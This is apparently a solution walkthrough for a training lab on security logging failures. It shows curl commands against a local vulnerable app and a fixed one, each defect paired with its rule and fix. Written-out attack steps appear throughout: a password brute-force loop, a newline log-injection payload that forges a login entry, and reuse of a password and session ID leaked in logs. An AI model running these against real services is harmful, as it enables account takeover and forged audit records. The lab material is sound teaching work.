🌐 **English** · [Русский](./SOLUTION.ru.md) · [Oʻzbekcha](./SOLUTION.uz.md)

# A09 — Solution walkthrough (spoilers)

Examples: `curl` against `http://127.0.0.1:8081` (vulnerable) and `http://127.0.0.1:8082` (fixed). On Windows, Git Bash or WSL (or `curl.exe` in PowerShell) is more convenient. The texts printed by the application itself are left in Russian, as in the real output; an English gloss is given in parentheses.

## Defect 1 — failed logins and access denials are not logged

Let us brute-force `bob`'s password (10 wrong attempts, then the right one), then log in as `alice` and try to open the administrator page:

```bash
for p in 123456 password qwerty 111111 abc123 letmein admin 12345678 iloveyou monkey bob123; do
  curl -s -o /dev/null -w "$p:%{http_code} " -X POST http://127.0.0.1:8081/login -H 'Content-Type: application/json' -d "{\"username\":\"bob\",\"password\":\"$p\"}"
done
# 123456:401 password:401 ... monkey:401 bob123:200
curl -s -c a.txt -X POST http://127.0.0.1:8081/login -H 'Content-Type: application/json' -d '{"username":"alice","password":"alice123"}'
curl -s -b a.txt http://127.0.0.1:8081/admin/export
# {"error": "только для администратора"} (administrators only)   (403)
curl -s http://127.0.0.1:8081/logs
# 2026-10-25T13:49:57 INFO app started
# 2026-10-25T13:49:57 INFO login ok user=admin password=Adm1n-L0g-Pass! sid=d71a9468ca1abd9e
# 2026-10-25T13:49:59 INFO login ok user=bob password=bob123 sid=1489ad9652431036
# 2026-10-25T13:49:59 INFO login ok user=alice password=alice123 sid=1ca24fb70a9940d0
```

Ten failures and an access denial left not a single line in the log. Only the last, successful attempt is visible.

**Rule:** we log not only success but also **failures and denials**: they are what reveals reconnaissance and brute force.

**Fix:** every failed login and every access denial is written to the journal (`# FIX 1`): the event, the outcome (`failure`), the user, the IP, the time.

## Defect 2 — log injection

The message from the feedback form is written to the log as is. A line break in it creates a "new entry" that nobody wrote:

```bash
curl -s -X POST http://127.0.0.1:8081/feedback -H 'Content-Type: application/json' \
  -d '{"name":"x","message":"hi\n2026-10-25T03:00:00 INFO login ok user=mallory"}'
curl -s http://127.0.0.1:8081/logs | tail -2
# 2026-10-25T13:49:59 INFO feedback from=x: hi
# 2026-10-25T03:00:00 INFO login ok user=mallory
curl -s http://127.0.0.1:8081/logs/summary
# {"flag": "FLAG{a09_log_forged}", "successful_logins": ["admin","bob","alice","mallory"], ...}
```

The analyzer parses the text line by line and concludes that the user `mallory` logged in, although that never happened.

**Rule:** everything that came from the user is untrusted before it is written to the log: we remove control characters (CR/LF), limit the length, and it is better to write in a structured way (JSON) than to concatenate a string.

**Fix:** a journal entry is a dictionary, not a string; values are stripped of control characters and truncated (`clean()`, `# FIX 2`). The same attempt in fixed turns into one entry with the message `hi 2026-10-25T03:00:00 INFO login ok user=mallory`: there is no forged "line".

## Defect 3 — passwords and sessions in the log

The line of a successful login holds the password and the session identifier. It is enough to read the log (see defect 5):

```bash
curl -s http://127.0.0.1:8081/logs | grep 'user=admin'
# 2026-10-25T13:49:57 INFO login ok user=admin password=Adm1n-L0g-Pass! sid=d71a9468ca1abd9e
```

Option 1 — log in with the password you found:

```bash
curl -s -c adm.txt -X POST http://127.0.0.1:8081/login -H 'Content-Type: application/json' -d '{"username":"admin","password":"Adm1n-L0g-Pass!"}'
curl -s -b adm.txt http://127.0.0.1:8081/admin/export
# {"balances": {...}, "flag": "FLAG{a09_secrets_in_logs}"}
```

Option 2 — substitute the session you found, you do not even need the password:

```bash
SID=$(curl -s http://127.0.0.1:8081/logs | grep -m1 'user=admin' | sed 's/.*sid=//')
curl -s -b "a09v_sid=$SID" http://127.0.0.1:8081/admin/export
# {"balances": {...}, "flag": "FLAG{a09_secrets_in_logs}"}
```

**Rule:** passwords, tokens, keys, card numbers and other secrets do not go into logs. Logs are read by many: developers, support, log collection systems.

**Fix:** the password is not logged at all, and instead of the session identifier a short fingerprint is written (the first 8 characters of SHA-256), which can be used to correlate events but cannot be used to log in (`# FIX 3`).

## Defect 4 — no alerts

After the brute force from defect 1:

```bash
curl -s http://127.0.0.1:8081/alerts
# {"alerts": [], "flag": "FLAG{a09_attack_unnoticed}", "note": "за это время было 10 неудачных входов, а оповещений нет — атаку никто не заметил"}
# (there were 10 failed logins in this time and no alerts — nobody noticed the attack)
```

The application does not react to a burst of failures in any way, the alert list is always empty.

**Rule:** logs by themselves wake nobody up. You need rules: how many events in which time window count as an alarm, and a channel through which the alarm reaches a person (email, chat, SIEM).

**Fix:** counters with a 60-second window and thresholds: 5 failed logins from one IP → `BRUTE_FORCE`, 3 access denials for one user → `ACCESS_DENIED_BURST` (`# FIX 4`). A triggered alert itself goes into the journal. In the lab the alerts are visible in `GET /alerts`; in a real system they are sent outward.

## Defect 5 — the log is available without authorization

```bash
curl -s http://127.0.0.1:8081/logs
```

No cookie and no password needed: anyone on the network reads the whole log, and with it everything that got there through defects 2 and 3.

**Rule:** a log is sensitive data: access only for those who need it by role, and reading it is logged too.

**Fix:** `GET /logs`, `/logs/summary`, `/logs/verify` and `/alerts` are available only to the administrator (`# FIX 5`). Everyone else gets 401/403, and every denial (403) goes into the journal and is counted by the alerts.

## Defect 6 — no audit of significant actions and no protection of logs from tampering

Let us reset the lab, log in as `bob` and transfer money:

```bash
curl -s -X POST http://127.0.0.1:8081/reset-lab
curl -s -c b.txt -X POST http://127.0.0.1:8081/login -H 'Content-Type: application/json' -d '{"username":"bob","password":"bob123"}'
curl -s -b b.txt -X POST http://127.0.0.1:8081/transfer -H 'Content-Type: application/json' -d '{"to":"alice","amount":500}'
# {"balance": 500, "ok": true}
curl -s http://127.0.0.1:8081/logs
# ... login ok user=bob ...   (not a word about the transfer)
```

Who transferred 500 and to whom cannot be reconstructed later. Now the attacker wipes the traces of their login:

```bash
curl -s -X POST http://127.0.0.1:8081/_lab/tamper -H 'Content-Type: application/json' -d '{"index":2,"text":null}'
curl -s http://127.0.0.1:8081/logs
# 2026-10-25T13:50:35 INFO app started
# 2026-10-25T13:50:35 INFO login ok user=admin password=...
```

The line with `bob`'s login is gone, and there is nothing in the application that could detect it.

**Rule:** significant actions (money, permissions, data export, settings changes) go into an audit journal: who, what, when, from where, the outcome. The journal is protected from changes: append-only storage, a copy on another machine, a hash chain or a signature on the entries.

**Fix:** transfers and exports are written to the journal (`audit("transfer", ...)`), and every entry contains `prev`, the hash of the previous entry, and its own `hash` (`# FIX 6`). `GET /logs/verify` recomputes the chain from the beginning.

## Checking fixed: you are the defender

The same scenario on `http://127.0.0.1:8082` (the admin password is in `fixed/app.py`):

```bash
# brute force + access denial
for p in 123456 password qwerty 111111 abc123 letmein admin 12345678 iloveyou monkey bob123; do
  curl -s -o /dev/null -X POST http://127.0.0.1:8082/login -H 'Content-Type: application/json' -d "{\"username\":\"bob\",\"password\":\"$p\"}"
done
curl -s -c a.txt -X POST http://127.0.0.1:8082/login -H 'Content-Type: application/json' -d '{"username":"alice","password":"alice123"}'
for u in /admin/export /logs /alerts; do curl -s -b a.txt http://127.0.0.1:8082$u; done

# look as the admin
curl -s -c adm.txt -X POST http://127.0.0.1:8082/login -H 'Content-Type: application/json' -d '{"username":"admin","password":"Adm1n-L0g-Pass!"}'
curl -s -b adm.txt http://127.0.0.1:8082/alerts
# {"alerts": [{"type":"BRUTE_FORCE","count":5,...}, {"type":"ACCESS_DENIED_BURST","key":"alice","count":3,...}]}
curl -s -b adm.txt http://127.0.0.1:8082/logs/verify
# {"entries": 18, "ok": true}

# the attacker edits the journal
curl -s -X POST http://127.0.0.1:8082/_lab/tamper -H 'Content-Type: application/json' -d '{"index":3,"text":"success"}'
curl -s -b adm.txt http://127.0.0.1:8082/logs/verify
# {"first_bad_seq": 4, "note": "журнал изменён: цепочка хешей нарушена", "ok": false}
# (the journal was changed: the hash chain is broken)
```

What remains outside the scope of the lab: the hash chain catches an edit or a deletion "in the middle", but not the deletion of the **last** entries, and not a recomputation of the whole chain by someone with full access to the storage. That is why in real systems the last hash is regularly sent to a separate server or to a SIEM. Blocking brute force (lockout, rate limit) is the topic of A07; here it is recording and alerting.

## Summary

| № | Defect | How it is shown | What is in fixed |
|---|--------|-----------------|------------------|
| 1 | Failures and denials are not logged | 10 wrong logins and a 403 left no traces | Every failure and denial is written to the journal |
| 2 | Log injection | `\n` in `message` creates a forged entry | Structured entries + stripping of control characters |
| 3 | Secrets in the log | The admin's password and `sid` read from the log | Secrets are not written, the session is replaced by a fingerprint |
| 4 | No alerts | `/alerts` is empty after 10 failed logins | Thresholds and a time window, alerts in the journal |
| 5 | The log is open | `GET /logs` without authorization | Administrator only, access denials are logged |
| 6 | No audit and no integrity | The transfer is not logged, a line is deleted unnoticed | Audit of significant actions + a hash chain and `/logs/verify` |
